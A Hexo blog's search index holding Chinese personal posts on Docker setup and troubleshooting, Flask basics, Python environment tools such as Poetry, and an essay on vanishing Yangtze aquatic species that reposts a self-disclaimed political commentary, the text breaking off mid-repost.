<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Docker笔记</title>
    <url>/69d4/</url>
    <content><![CDATA[<p>开始折腾Docker，等待填坑 <a id="more"></a></p>
<p>好耶，是容器。坏耶，是容器。</p>
<h2 id="基本设置和操作">基本设置和操作</h2>
<h3 id="docker设置">Docker设置</h3>
<p>一定要先启动, 不然有可能<code>Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> docker start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>使用<code>docker exec -it XXXXXX bash</code>进入容器的命令界面，输入exit退出</p>
<p>同步Docker容器和宿主机的时间：<code>docker cp /etc/localtime &lt;container id&gt;:/etc/localtime</code></p>
<p>加当前用户到用户组里面</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gpasswd -a <span class="token variable">$&#123;<span class="token environment constant">USER</span>&#125;</span> docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="离线装docker镜像">离线装Docker镜像</h4>
<p>教研室服务器的网一直出问题，还有一台机子没有外网 决定离线搞Docker镜像 发现Docker有离线的方法，就是直接在别的机子上pull，然后</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">docker save -o mysql.tar mysql<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>把生成的tar文件拷到服务器上</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">docker load -i  mysql.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="docker-compose-部署">Docker Compose 部署</h3>
<p>当部署多个Docker容器，它们之间还有关联的时候，就用Compose代替Docker run，比如师兄Flask写的标注工具，就是前后端分别一个Docker容器</p>
<p>运行：<code>docker-compose up</code>自动创建</p>
<h3 id="docker镜像">Docker镜像</h3>
<p>Docker镜像（image）也是一堆文件，可以自己建或者从远程pull别人建好的 有了Docker镜像，再写好Dockerfile就可以跑起来了（跑起来之后就是个容器container）</p>
<h3 id="dockerfile">Dockerfile</h3>
<p>语法近似bash脚本，填写好之后启动会根据文件里面的配置逐步执行</p>
<h2 id="常用命令">常用命令</h2>
<table>
<thead>
<tr class="header">
<th>Command</th>
<th>功能</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>Docker build</td>
<td>创建镜像</td>
</tr>
<tr class="even">
<td>Docker create</td>
<td>创建镜像（并不启动）</td>
</tr>
<tr class="odd">
<td>Docker exec</td>
<td>在Docker里面执行命令</td>
</tr>
<tr class="even">
<td>Docker images</td>
<td>查看镜像</td>
</tr>
<tr class="odd">
<td>Docker pull/push</td>
<td>下载/上传镜像</td>
</tr>
<tr class="even">
<td>Docker rm/rmi</td>
<td>删除容器/镜像</td>
</tr>
<tr class="odd">
<td>Docker export/import</td>
<td>导出导入容器</td>
</tr>
<tr class="even">
<td>Docker import/load</td>
<td>导出导入镜像</td>
</tr>
<tr class="odd">
<td>Docker start/stop/restart/pause/unpause/kill</td>
<td>略</td>
</tr>
</tbody>
</table>
<h2 id="踩坑记录">踩坑记录</h2>
<h3 id="一次弱智的踩坑">一次弱智的踩坑</h3>
<p>各位看官散了吧，都是一堆弱智操作搞的</p>
<p><code>Failed to enable unit: Unit file /etc/systemd/system/docker.service is masked.</code></p>
<p>执行</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl unmask docker.service
systemctl unmask docker.socket
systemctl start docker.service<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>出现 <code>Job for docker.service failed because the control process exited with error code. See "systemctl status docker.service" and "journalctl -xe" for details.</code></p>
<p>出现<code>Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?</code></p>
<p>出现<code>systemd[1]: Failed to start LSB: Create lightweight, portable, self-sufficie</code></p>
<p>Docker pull出现<code>Error response from daemon: Get https://registry-1.docker.io/v2/: dial tcp 34.201.196.144:443: connect: connection refused</code></p>
<p>是镜像源或者DNS的问题，参照<span class="exturl" data-url="aHR0cHM6Ly95ZWFzeS5naXRib29rcy5pby9kb2NrZXJfcHJhY3RpY2UvaW5zdGFsbC9taXJyb3IuaHRtbA==">这里<i class="fa fa-external-link-alt"></i></span>改了。（阿里的和中科大的教研室的鬼畜教育网根本不稳，最后换了华为的（要注册账号））</p>
<p>出现<code>pkg_resources.DistributionNotFound: The 'docker-compose==1.8.0' distribution was not found and is required by the application</code></p>
<p>想用Docker-compose结果报了一堆python的错</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">Traceback (most recent call last):
  File &quot;&#x2F;usr&#x2F;bin&#x2F;docker-compose&quot;, line 5, in &lt;module&gt;
    from pkg_resources import load_entry_point
  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;pkg_resources&#x2F;__init__.py&quot;, line 2927, in &lt;module&gt;
    @_call_aside
  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;pkg_resources&#x2F;__init__.py&quot;, line 2913, in _call_aside
    f(*args, **kwargs)
  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;pkg_resources&#x2F;__init__.py&quot;, line 2940, in _initialize_master_working_set
    working_set &#x3D; WorkingSet._build_master()
  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;pkg_resources&#x2F;__init__.py&quot;, line 635, in _build_master
    ws.require(__requires__)
  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;pkg_resources&#x2F;__init__.py&quot;, line 943, in require
    needed &#x3D; self.resolve(parse_requirements(requirements))
  File &quot;&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;pkg_resources&#x2F;__init__.py&quot;, line 829, in resolve
    raise DistributionNotFound(req, requirers)
pkg_resources.DistributionNotFound: The &#39;docker-compose&#x3D;&#x3D;1.8.0&#39; distribution was not found and is required by the application<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>看到网上的解决方案说</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip3 <span class="token function">install</span> backports.ssl_match_hostname --upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>结果pip3居然又报错了了</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">pip is configured with locations that require TLS&#x2F;SSL, however the ssl module in Python is not available.
Collecting backports.ssl_match_hostname
  Retrying (Retry(total&#x3D;4, connect&#x3D;None, read&#x3D;None, redirect&#x3D;None, status&#x3D;None)) after connection broken by &#39;SSLError(&quot;Can&#39;t connect to HTTPS URL because the SSL module is not available.&quot;,)&#39;: &#x2F;simple&#x2F;backports-ssl-match-hostname&#x2F;
  Retrying (Retry(total&#x3D;3, connect&#x3D;None, read&#x3D;None, redirect&#x3D;None, status&#x3D;None)) after connection broken by &#39;SSLError(&quot;Can&#39;t connect to HTTPS URL because the SSL module is not available.&quot;,)&#39;: &#x2F;simple&#x2F;backports-ssl-match-hostname&#x2F;
  Retrying (Retry(total&#x3D;2, connect&#x3D;None, read&#x3D;None, redirect&#x3D;None, status&#x3D;None)) after connection broken by &#39;SSLError(&quot;Can&#39;t connect to HTTPS URL because the SSL module is not available.&quot;,)&#39;: &#x2F;simple&#x2F;backports-ssl-match-hostname&#x2F;
  Retrying (Retry(total&#x3D;1, connect&#x3D;None, read&#x3D;None, redirect&#x3D;None, status&#x3D;None)) after connection broken by &#39;SSLError(&quot;Can&#39;t connect to HTTPS URL because the SSL module is not available.&quot;,)&#39;: &#x2F;simple&#x2F;backports-ssl-match-hostname&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>哇，又是SSL证书的问题</p>
<p>参照<span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvNDU5NTQ1MjgvcGlwLWlzLWNvbmZpZ3VyZWQtd2l0aC1sb2NhdGlvbnMtdGhhdC1yZXF1aXJlLXRscy1zc2wtaG93ZXZlci10aGUtc3NsLW1vZHVsZS1pbg==">stackoverflow的解决方案<i class="fa fa-external-link-alt"></i></span></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> -s

<span class="token function">apt</span> <span class="token function">install</span> libssl-dev libncurses5-dev libsqlite3-dev libreadline-dev libtk8.5 libgdm-dev libdb4o-cil-dev libpcap-dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>切到<code>the folder with the Python 3.X library source code</code>，一般在<code>/usr/local/bin</code>底下的python文件夹 运行</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./configure
<span class="token function">make</span>
<span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>依然不行 怀疑是SSL证书的问题，curl使用ssl也报错 但是openssl、libssl-dev都装了的</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> ca-certificates<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>证书没过期</p>
<p>又运行了一下openssh居然报错connect:errno=111</p>
<p>查了一下 &gt;This has nothing to do with SSL. Connection refused means that either there is no server or the connection is blocked by firewall. In your case (before your edit) the server is also plain wrong, i.e. ":443" is no valid server name (hostname missing).</p>
<p>难道就是防火墙的问题吗？</p>
<p>查看了一下网络状态</p>
<p>没问题的工作站</p>
<pre class="line-numbers language-none"><code class="language-none">tcp        0      0 211.83.111.221:40294    211.83.111.224:443      ESTABLISHED 1825&#x2F;telnet<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>有问题的服务器</p>
<pre class="line-numbers language-none"><code class="language-none">tcp6       0      0 :::443                  :::*                    LISTEN      101411&#x2F;apache2
tcp6       0      0 211.83.111.224:443      211.83.111.221:40294    ESTABLISHED 101415&#x2F;apache2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>难道学校的ipv6又炸了？</p>
<p>试试<code>nc -l 443</code></p>
<p>emmm，被占用了</p>
<p>不对，我傻逼了，这是对外的端口啊。。。。</p>
<p>等吧</p>
<p><strong>更新</strong>是网费没了没充钱的问题...... 老蔡师兄不是校内的网连不上也是没充钱学校网管给断外网了...... 前几天那个Ubuntu Desktop的工作站最近也没钱了，但是http在终端可以用，镜像源什么的也能连，但是那个浏览器一打开就提示我登录账号。 突然意识到了不对，怀疑服务器的网也没钱了。 其实之前一直怀疑是被制裁了，但是工作站就是好的，才一直以为是SSL证书之类的问题 充钱之后，神奇的都能用了 看来是http神奇的逃脱了没钱的制裁 行吧，在这里排查了四五天，期间还重装过好几次Ubuntu Server 果然还是得充钱啊</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/jiaqian.png" alt="Picture" style="zoom:60%;" /></p>
<h2 id="参考">参考</h2>
<h2 id="再看docker">再看Docker</h2>
<p>被人骗入坑Docker，甚至教研室服务器上基本全是Docker跑的一个个容器，甚至MySQL都是跑在Docker上的。</p>
<p><span class="exturl" data-url="aHR0cDovL2RvY2tvbmUuaW8vYXJ0aWNsZS82NjA=">http://dockone.io/article/660<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9qaW1teXNvbmcuaW8vZG9ja2VyLWhhbmRib29rLw==">https://jimmysong.io/docker-handbook/<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>笔记&amp;札记</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask接锅记</title>
    <url>/ff2b/</url>
    <content><![CDATA[<p>动态语言一时爽，维护重构火葬场 <a id="more"></a></p>
<h2 id="前言">前言</h2>
<p>国庆假期之后开始了偶滴搬砖生活，教研室有个师兄在拿Flask做微信公众号的文章推送后端。为了读祖传代码，准备折腾Flask。 据说Flask和Django差不了太多，之前Django用的很菜，也不打算拿Django或node之类的重构一边，索性就跳Flask的坑吧</p>
<h2 id="配置">配置</h2>
<p>[1] 开启Debug模式。1.0之后直接在Pycharm的Configuration里勾选开启就好了。或者</p>
<pre><code>export Flask_Debug = 1 # win系统使用set命令</code></pre>
<p>[2] 使用装饰器，在指定url或修改请求方式时常用，如</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'Hello, World'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>指定请求方式</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>[3] 处理请求、文件传输和cookies等 都在flask的request库里</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>[4] 数据库用SQLAlchemy可以像Django一样用python操作数据库，建表查询调用。</p>
<h2 id="蓝图">蓝图</h2>
<p>我们项目再大一些，就要拆分模块，Flask一般使用蓝图(Blueprint) 这样注册</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
<span class="token keyword">from</span> yourapplication<span class="token punctuation">.</span>simple_page <span class="token keyword">import</span> simple_page

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>register_blueprint<span class="token punctuation">(</span>simple_page<span class="token punctuation">,</span> url_prefix<span class="token operator">=</span><span class="token string">'/pages'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样引用</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
<span class="token keyword">from</span> yourapplication<span class="token punctuation">.</span>simple_page <span class="token keyword">import</span> simple_page

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>register_blueprint<span class="token punctuation">(</span>simple_page<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>也可以作为资源放置静态文件，详见官方文档</p>
<h2 id="视图和模板">视图和模板</h2>
<p>Flask的模板(template)用的Jinja2，基本都是标签的形式，和Django的模板非常像，类似这种</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html">&#123;% block title %&#125;&#123;% endblock %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>(我刚刚又查了一下，Django的自带模板就是基于Jinja的魔改版，应该是Django模板像Jinja2，说反了)</p>
<p>视图函数一般用来处理入站请求，我们用装饰器把函数注册为事件处理程序，大概这个样子</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/user/&lt;name>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">usr</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'Hello World,&#123;&#125;!'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="项目填坑">项目填坑</h2>
<p>要搞一个微信公众号推送内容，用Flask作为后端，微信接口的大坑等会再填 申请公众号，测试号之类的略过不表。（GRD腾讯真的烦啊，还要身份证号一堆乱七八糟的，开了个人号还一堆权限不给，文档也差，更新慢还经常404打不开，那个什么Telegram Channel，就是比微信高到不知哪里去了。算了，甲方有需求，那就忍了）<br />
<del>先提前祝愿微信早日倒闭</del></p>
<h2 id="其他">其他</h2>
<p>跨域请求：安装flask-cors, 设置一下就行了</p>
<pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">from flask_cors import CORS
···
CORS(app, supports_credentials&#x3D;True)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>在chrome的新特性中，使用Same-Site Cookies来解决CSRF跨域攻击的问题，没设置会报这种警告, 在未来的版本中，没设置是不允许跨域的</p>
<pre class="line-numbers language-none"><code class="language-none">A cookie associated with a cross-site resource at http:&#x2F;&#x2F;··· was set without the &#96;SameSite&#96; attribute. A future release of Chrome will only deliver cookies with cross-site requests if they are set with &#96;SameSite&#x3D;None&#96; and &#96;Secure&#96;.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>设置一下属性就好了</p>
<p>生成和导入requirements</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">pip freeze <span class="token operator">></span> requirements<span class="token punctuation">.</span>txt
pip install <span class="token operator">-</span>r requirements<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>使用哈希值存储用户密码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>security <span class="token keyword">import</span> generate_password_hash<span class="token punctuation">,</span> check_password_hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="flask部署">Flask部署</h2>
<p>这里我用的Docker。照着<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC83ODQzMjcxOQ==">这里<i class="fa fa-external-link-alt"></i></span>部署的 这里没有用Nginx，直接上的gunicorn，回头看一下Nginx怎么搞 这里有个<span class="exturl" data-url="aHR0cDovL2RvY3MuZ3VuaWNvcm4ub3JnL2VuL3N0YWJsZS9kZXBsb3kuaHRtbA==">官方文档<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>笔记&amp;札记</category>
      </categories>
      <tags>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>Pythonic手账</title>
    <url>/a343/</url>
    <content><![CDATA[<p>等待填坑 <a id="more"></a></p>
<h2 id="碎碎念">碎碎念</h2>
<p>2020年了，python2该退休了（真是不太想再看到python2了，祖传依赖令人头大）</p>
<p>安利包管理工具poetry，试了都说好</p>
<p>python3.8怕是串了Go和C++的味，算了，真香</p>
<h2 id="python多版本管理">python多版本管理</h2>
<p>python的包管理是个很混乱的事， 一般单版本基本上没事，但是装了N个版本，甚至还有python2，麻烦就来了，一不小心就被坑，尤其是在大家都用的服务器上。（这上面有2.7，3.5，3.6和师兄炼丹装的conda3.7、3.6，不要问我为什么linux装conda，师兄干的）</p>
<p>我用自己的linux用户可以避开root用户底下一些混乱环境（比如conda） 主要的问题是切换python版本和python包管理，切换python版本一般用pyenv；包管理选择很多，一直没发现特别完美的工具。直到，发现了Poetry</p>
<h3 id="pyenv">pyenv</h3>
<p>pyenv用来切换python版本，配合其他工具管理包</p>
<h3 id="venv和virtualvenv">venv和virtualvenv</h3>
<p>venv是<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvemgtY24vMy90dXRvcmlhbC92ZW52Lmh0bWw=">python3官方的包管理工具<i class="fa fa-external-link-alt"></i></span>，virtualvenv兼容py2、3，这两个感觉用的最多了，看到别人的很多项目都用的这个，pycharm默认也是这玩意 没什么特殊需求就用这个吧</p>
<h3 id="pipenv">pipenv</h3>
<p>一个类似Ruby的Bundler的东西 纯指定依赖，使用体验比上面那个好，有一点慢 （不推荐在win上用）</p>
<p>就跟npm差不多，和node_modules差不多的Pipfile（存放本地包），和npm的package-lock.json差不多的Pipfile.lock（版本锁）</p>
<p>但是，这家伙会趁你不注意偷偷更新你的依赖。注意不要被它的自动更新坑了，你以为它能给你锁定版本，其实不能。</p>
<h3 id="poetry">Poetry</h3>
<p>用了一阵发现这个挺好，喜欢</p>
<p>能管理python版本和python的包，还能用来打包（这个打包感觉比setuptools舒服不少） 配置文件是单个toml，很舒服，依赖在poetry.lock里面</p>
<p>一个小问题是初次加载依赖有点慢，原因见<span class="exturl" data-url="aHR0cHM6Ly9weXRob24tcG9ldHJ5Lm9yZy9kb2NzL2ZhcS8jd2h5LWlzLXRoZS1kZXBlbmRlbmN5LXJlc29sdXRpb24tcHJvY2Vzcy1zbG93">这里<i class="fa fa-external-link-alt"></i></span>。这也不能怪poetry，PyPI上那么多库，还有不少野库，很多库并没有规范声明Metadata，poetry没法通过调PyPI的API判断该下哪种版本的包，就只能把所有的都拉下来然后判断该用哪个</p>
<p>我们打开poetry.lock文件,可以看到，一个版本所有的发行包（packages）都被拉了下来</p>
<figure>
<img src="/a343/image-20200427232343931.png" alt="poetry.lock" /><figcaption aria-hidden="true">poetry.lock</figcaption>
</figure>
<p>这个目前无解 &gt;At the moment there is no way around it.</p>
<p>如果再次用到某个库，poetry之前缓存了发行信息，不会出现那种全下一遍的事了 &gt;Once Poetry has cached the releases' information, the dependency resolution process will be much faster.</p>
<p>目前还没有太好的办法，在<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi1wb2V0cnkvcG9ldHJ5L2lzc3Vlcy8yMDk0I2lzc3VlY29tbWVudC02MDk2NDgxOTQ=">issue评论区<i class="fa fa-external-link-alt"></i></span>看到一个扭曲的方法</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">poetry <span class="token builtin class-name">export</span> -f requirements.txt <span class="token operator">></span> requirements.txt
python -m pip <span class="token function">install</span> -r requirements.txt
poetry <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="docker虚拟机">Docker&amp;虚拟机</h3>
<p>Django之类的项目部署的时候推荐Docker 一般开发环境没有必要上Docker，真机就挺好，Docker不熟悉的反而可能造成不少麻烦(比如网络部分那堆坑)，怕搞乱环境不如直接上虚拟机。 Docker的镜像有官方的python，但是非常大，上G。如果自己写Dockerfile构建一个，缩减镜像，调度每个容器的内存，都是远比前面那几个东西麻烦的事情。 Docker我感觉并不适合个人开发环境，感觉部署和运行的时候方便点，用来当开发环境体验不是太好。 Docker在调试的时候并不太舒服，而且对Docker初学者来说，网络那里很多坑，为了方便或节省时间用Docker配python的开发环境 但是这么一配置，怎么比原来麻烦多了，Docker狂热爱好者吹嘘的部署方便这里在需要调试的时候并没有什么优势。 虽然Docker本身并不吃你太多内存，但是Docker容器跑起来，如果不调度和限制，经常占了好多内存，虽然写python一般也不在乎在这个。</p>
<h3 id="anaconda">anaconda</h3>
<p>我反正不喜欢，没怎么用过，看到这种全家桶我就害怕（早年360和金山留下的阴影，请谅解）。 把python当matlab用的、习惯matlab那种又大又卡但是科学计算功能齐全的全家桶的人可以装个这个。 win10有些包很难装，倒是可以把ananconda当jupyter notebook的win10安装工具人；平时就写写python玩就不要装这玩意了，打开win10的应用商店，搜python，点安装，好了，用吧 炼丹CUDA之类的建议出门左转用Linux，win10跟torch之类的东西八字不合，这是conda也挽救不了的</p>
<h2 id="参考">参考</h2>
<ol type="1">
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cucHl0aG9uLm9yZy9kZXYvcGVwcy9wZXAtMDAwOC8=">PEP8<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9ndW9ydWliaWFvLmdpdGJvb2tzLmlvL2VmZmVjdGl2ZS1weXRob24vY29udGVudC8=">Effective Python 翻译版<i class="fa fa-external-link-alt"></i></span></li>
<li>Fluent Python</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cucHlsaW50Lm9yZy8=">pylint<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9weXRob24tcG9ldHJ5Lm9yZy8=">poetry官网<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RlcGhlbGwvZGVwaGVsbA==">dephell打包工具<i class="fa fa-external-link-alt"></i></span></li>
</ol>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>远去的水族生灵</title>
    <url>/before-vanish/</url>
    <content><![CDATA[<p>又南水行七百里，曰孟子之山，其木多梓桐，多桃李，其草多菌浦，其兽多麋鹿。是山也，广员百里。其上有水出焉, 名日碧阳，其中多鳣鲔 <a id="more"></a></p>
<p><img src="/before-vanish/water.jpg" /></p>
<p>元旦在沙河边转着玩，又看到沙河有一群大妈拿着七八个桶直接倾倒鱼和小龙虾（对，就是那个<del>著名</del>入侵物种克氏原螯虾）。这几天网上冲浪又看到日人民报等辣鸡营销号消费过世白鲟，还纷纷把图配成匙吻鲟，心里不是滋味。长江流域基本也凉的差不多了，当年葛洲坝一建，白鲟中华鲟达氏鲟就凉了一半，挖沙和万安水库和富春江水电站也把最后的鲥鱼搞没了。鄱阳湖要是再乱搞，江豚基本也要凉透了（虽然不乱搞也要凉透了，时间问题，无力回天）。那些数不清名字的小鱼就更惨了，好多两个图片和影像都没留下</p>
<p>哦，对了，前几年长江养殖逃逸了大量杂交鲟，中华鲟和达氏鲟野生种群基本就废了</p>
<p>寡鳞鱊重现江湖的奇迹可能再也不会有了。</p>
<blockquote>
<p>千斤魶子万斤象，黄排大了不像样</p>
</blockquote>
<figure>
<img src="baixun.jpg" alt="白鲟" /><figcaption aria-hidden="true">白鲟</figcaption>
</figure>
<p>就现在这样子，不仅斑鳖要上路，鼋八成也保不住；不仅白鱀豚没了，江豚（窄脊江豚长江江豚亚种<em>N. a. asiaeorientalis</em>）也迟早凉。 斑鳖在某动物园的惨状大家应该都知道了，鼋也好不到哪去（国内的龟鳖都好不到哪去） &gt;鼋，到现在，都没有一个像样的保护区。也就是说，救助团体一直是民间（或挂靠）开展的。某保护区我就不点名了，有文件，一直不施工，民间捐的俩成体鼋一直养在水泥池子里……</p>
<p>最近被骂的<span class="exturl" data-url="aHR0cHM6Ly93ZWliby5jb20vNTAyMTAzNjc4Ni9JbkIxUmZrQkU=">扎龙保护区<i class="fa fa-external-link-alt"></i></span>也是打着保护的旗号干缺德事呢，对了，前几年的鄱阳湖水利枢纽工程也是打着环保的旗号。好多湿地绿化和荒漠绿化都是把原来好好的灌木草地沼泽全种成整齐划一的树，哇，这破坏生态的绿色荒漠算政绩呢 这里全文转载流年消年少同学的一篇旧文：从鄱阳湖水利枢纽工程看看党的千秋伟业</p>
<div class="note info"><blockquote>
<p>逆天改命，非以倾国之力而不能为</p>
</blockquote>
<p>​​​ 2016年底，微博上因为江西省水利厅一篇《 鄱阳湖水利枢纽环评 请你提建议》的公告引发了不小的风波。无疑这个举动将会对鄱阳湖生态环境造成巨大的负面影响，濒危的长江江豚、白鹤也将为此陷入灭绝的境地，那为什他们会出此下策呢？前几天与老师朋友讨论这个事情，个中缘由可能真的不简单。</p>
<p>下面都是胡说八道，大家请勿轻信 我们先看看好端端的鄱阳湖​为什么会见底？没错，因为我党的两项“千秋伟业”。 目前，中国两大世纪水利工程——三峡工程早已完成、南水北调工程东线刚刚正通水，中线已经贯通，西线还未开工中。对于如此重大的工程，一直有颇多争议，如修建三峡时，反对意见也非常强烈。三峡建成后，是否会引发干旱、地震等自然灾害都成为了人们热议的焦点。而奇怪的是，南水北调工程几乎没有专家反对，顺利开工建成。对南水北调的质疑也远远不如三峡工程。这是很令人奇怪的地方 多年前，一位旅居德国的国土专家王维洛为就揭底了南水北调和三峡，个中缘由触目惊心。 前几年长江中下游缺水缺得很厉害。从浙江、安徽、江西、湖南和湖北都缺水，特别是湖北省缺水缺的厉害。国内报导是说，湖北的水库都已底朝天，没水了，洪水浪打浪也没浪了。洪湖水也就剩几十厘米深。根本原因是因为湖北省担任了中国两个最大的工程—三峡和南水北调工程。其实这两个工程是一个姐妹工程，密不分，南水北调中线方案的源头工程，就是三峡的水源工程。三峡工程问题突出的原因，并非像国内宣传的那样是什么三峡派海外黑手搞的，其实是国内地方对中央矛盾所引起的。因为干旱现象在湖北和江西已非常突出了。 三峡工程干旱问题的治理，首先是江西省在13年提出来的，是省水利厅一些技术人员要搞鄱阳湖拦水大坝工程。为什么要建这个工程？是因为三峡大坝影响了鄱湖的蓄水，这么引出来的。 2013年的干旱，是当时专家预计的2030年要出现的，那么现在2011年就出现了。而且缺的很厉害，也不像人们说的南方水多，长江流域也将进入枯水，中下游缺缺的很厉害，尤其是湖北省。当时的湖北所有水库几乎是底朝天了。就是南水北调中线工程源头的水库—丹江河水库水位已降到死水位，没有水可以向外排放了。以当时湖北省要求三峡水库赶紧放水。如果当时三峡工程放水的话，就可以看到一个相当可怕的过程，就是说三峡把每天放3000至5000多立方米的水，但是水到湖北地区马上就被抽上去。 